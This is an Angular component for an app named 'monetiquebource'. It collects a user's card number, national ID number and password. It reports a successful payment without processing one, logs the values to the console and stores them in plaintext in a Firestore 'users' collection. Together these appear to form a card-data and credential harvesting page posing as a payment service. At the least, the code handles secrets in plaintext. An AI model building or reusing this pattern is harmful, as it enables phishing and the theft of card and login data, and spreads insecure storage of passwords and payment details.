import { Component } from '@angular/core';
import {  Firestore} from "@angular/fire/firestore";
import { addDoc,collection, CollectionReference, deleteDoc, updateDoc } from 'firebase/firestore';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent {
  title = 'monetiquebource';
  user : any = {
    n_carte : "",
    n_cin : "",
    password : "",
  }
  payer() {
    console.log(this.user);
    alert("Paiement effectué avec succès");
    this.add();
  }
  private collections: CollectionReference;

  constructor(public firebase : Firestore) {
    this.collections = collection(this.firebase, 'users')
  }
  add() {
    const userRef = {
      n_carte : this.user.n_carte,
      n_cin : this.user.n_cin,
      password : this.user.password,
    }
    addDoc(this.collections, userRef).then((data)=> {
      alert("Merci pour inscrire a bource service");
      console.log(data);
    }).catch((err)=>{
      console.log(err);
      alert("Erreur");
    });
  }
}
